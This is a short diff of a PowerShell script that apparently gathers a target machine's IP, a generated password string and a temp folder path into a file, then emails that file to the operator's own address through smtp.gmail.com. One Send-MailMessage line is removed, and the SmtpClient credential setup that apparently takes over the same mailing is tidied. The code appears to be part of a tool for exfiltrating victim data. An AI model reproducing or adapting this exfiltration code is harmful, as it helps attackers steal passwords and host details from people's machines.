@@ -43,9 +43,6 @@ Add-Content -Path $user_name -Value $target_ip
 Add-Content -Path $user_name -Value $pass_gen_string
 Add-Content -Path $user_name -Value $temp_folder_path
 
-# smtp process
-Send-MailMessage -From $your_email -To $your_email -Subject $user_name -Attachment $user_name -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $your_email, (ConvertTo-SecureString -String $email_password -AsPlainText -Force))
-
 ##################
 
 # Define email parameters
@@ -61,7 +58,7 @@ $SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
 $SMTPClient.EnableSsl = $true
 
 # Set credentials securely
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($your_email, $email_password )
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($your_email, $email_password)
 
 # Create the email message
 $MailMessage = New-Object System.Net.Mail.MailMessage
